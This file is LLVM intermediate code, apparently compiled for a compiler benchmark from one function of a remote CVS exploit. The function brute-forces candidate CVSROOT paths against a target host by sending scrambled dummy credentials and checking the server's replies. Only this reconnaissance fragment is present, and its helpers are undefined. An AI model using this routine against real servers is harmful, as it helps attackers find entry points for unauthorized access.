; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_300.c_brute_cvsroot.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_300.c_brute_cvsroot.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i64 }

@.str = private unnamed_addr constant [25 x i8] c"Bruteforcing cvsroot...\0A\00", align 1
@CVSROOTS = common dso_local global %struct.TYPE_2__* null, align 8
@host = common dso_local global i32 0, align 4
@port = common dso_local global i32 0, align 4
@CVS_VERIF = common dso_local global i32 0, align 4
@DUMMY = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [21 x i8] c"Trying CVSROOT = %s\09\00", align 1
@CVS_BAD_REP = common dso_local global i32 0, align 4
@BAD_TRIP = common dso_local global i8* null, align 8
@CVS_AUTH_FAILED = common dso_local global i32 0, align 4
@CVS_AUTH_SUCCESS = common dso_local global i32 0, align 4
@CVS_NO_USER = common dso_local global i32 0, align 4
@GOOD_TRIP = common dso_local global i8* null, align 8
@root = common dso_local global i64 0, align 8
@user = common dso_local global i64 0, align 8
@pass = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @brute_cvsroot() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  %5 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %2, align 4
  br label %6

6:                                                ; preds = %96, %0
  %7 = load %struct.TYPE_2__*, %struct.TYPE_2__** @CVSROOTS, align 8
  %8 = load i32, i32* %2, align 4
  %9 = sext i32 %8 to i64
  %10 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %7, i64 %9
  %11 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %10, i32 0, i32 1
  %12 = load i64, i64* %11, align 8
  %13 = icmp ne i64 %12, 0
  br i1 %13, label %14, label %99

14:                                               ; preds = %6
  %15 = load i32, i32* @host, align 4
  %16 = load i32, i32* @port, align 4
  %17 = call i32 @nopen(i32 %15, i32 %16)
  %18 = load i32, i32* @CVS_VERIF, align 4
  %19 = load %struct.TYPE_2__*, %struct.TYPE_2__** @CVSROOTS, align 8
  %20 = load i32, i32* %2, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %19, i64 %21
  %23 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %22, i32 0, i32 1
  %24 = load i64, i64* %23, align 8
  %25 = load i32, i32* @DUMMY, align 4
  %26 = load i32, i32* @DUMMY, align 4
  %27 = call i32 @scramble(i32 %26)
  %28 = call i32 @nprintf(i32 %18, i64 %24, i32 %25, i32 %27)
  %29 = load %struct.TYPE_2__*, %struct.TYPE_2__** @CVSROOTS, align 8
  %30 = load i32, i32* %2, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %29, i64 %31
  %33 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %32, i32 0, i32 1
  %34 = load i64, i64* %33, align 8
  %35 = call i32 (i8*, ...) @info(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), i64 %34)
  %36 = call i8* (...) @flush_sock()
  store i8* %36, i8** %4, align 8
  %37 = call i32 (...) @nclose()
  %38 = load i8*, i8** %4, align 8
  %39 = icmp ne i8* %38, null
  br i1 %39, label %40, label %45

40:                                               ; preds = %14
  %41 = load i8*, i8** %4, align 8
  %42 = load i32, i32* @CVS_BAD_REP, align 4
  %43 = call i64 @strstr(i8* %41, i32 %42)
  %44 = icmp ne i64 %43, 0
  br i1 %44, label %45, label %48

45:                                               ; preds = %40, %14
  %46 = load i8*, i8** @BAD_TRIP, align 8
  %47 = call i32 (i8*, ...) @info(i8* %46)
  br label %93

48:                                               ; preds = %40
  %49 = load i8*, i8** %4, align 8
  %50 = load i32, i32* @CVS_AUTH_FAILED, align 4
  %51 = call i64 @strstr(i8* %49, i32 %50)
  %52 = icmp ne i64 %51, 0
  br i1 %52, label %63, label %53

53:                                               ; preds = %48
  %54 = load i8*, i8** %4, align 8
  %55 = load i32, i32* @CVS_AUTH_SUCCESS, align 4
  %56 = call i64 @strstr(i8* %54, i32 %55)
  %57 = icmp ne i64 %56, 0
  br i1 %57, label %63, label %58

58:                                               ; preds = %53
  %59 = load i8*, i8** %4, align 8
  %60 = load i32, i32* @CVS_NO_USER, align 4
  %61 = call i64 @strstr(i8* %59, i32 %60)
  %62 = icmp ne i64 %61, 0
  br i1 %62, label %63, label %89

63:                                               ; preds = %58, %53, %48
  %64 = load i8*, i8** @GOOD_TRIP, align 8
  %65 = call i32 (i8*, ...) @info(i8* %64)
  %66 = load i32, i32* %2, align 4
  %67 = load %struct.TYPE_2__*, %struct.TYPE_2__** @CVSROOTS, align 8
  %68 = load i32, i32* %2, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %67, i64 %69
  %71 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %70, i32 0, i32 0
  store i32 %66, i32* %71, align 8
  %72 = load %struct.TYPE_2__*, %struct.TYPE_2__** @CVSROOTS, align 8
  %73 = load i32, i32* %2, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %72, i64 %74
  %76 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %75, i32 0, i32 1
  %77 = load i64, i64* %76, align 8
  store i64 %77, i64* @root, align 8
  %78 = load i64, i64* @user, align 8
  %79 = icmp ne i64 %78, 0
  br i1 %79, label %80, label %86

80:                                               ; preds = %63
  %81 = load i64, i64* @pass, align 8
  %82 = icmp ne i64 %81, 0
  br i1 %82, label %83, label %86

83:                                               ; preds = %80
  %84 = load i8*, i8** %4, align 8
  %85 = call i32 @free(i8* %84)
  store i32 1, i32* %1, align 4
  br label %101

86:                                               ; preds = %80, %63
  %87 = load i32, i32* %3, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %3, align 4
  br label %92

89:                                               ; preds = %58
  %90 = load i8*, i8** @BAD_TRIP, align 8
  %91 = call i32 @printf(i8* %90)
  br label %92

92:                                               ; preds = %89, %86
  br label %93

93:                                               ; preds = %92, %45
  %94 = load i8*, i8** %4, align 8
  %95 = call i32 @free(i8* %94)
  br label %96

96:                                               ; preds = %93
  %97 = load i32, i32* %2, align 4
  %98 = add nsw i32 %97, 1
  store i32 %98, i32* %2, align 4
  br label %6

99:                                               ; preds = %6
  %100 = load i32, i32* %3, align 4
  store i32 %100, i32* %1, align 4
  br label %101

101:                                              ; preds = %99, %83
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

declare dso_local i32 @info(i8*, ...) #1

declare dso_local i32 @nopen(i32, i32) #1

declare dso_local i32 @nprintf(i32, i64, i32, i32) #1

declare dso_local i32 @scramble(i32) #1

declare dso_local i8* @flush_sock(...) #1

declare dso_local i32 @nclose(...) #1

declare dso_local i64 @strstr(i8*, i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @printf(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
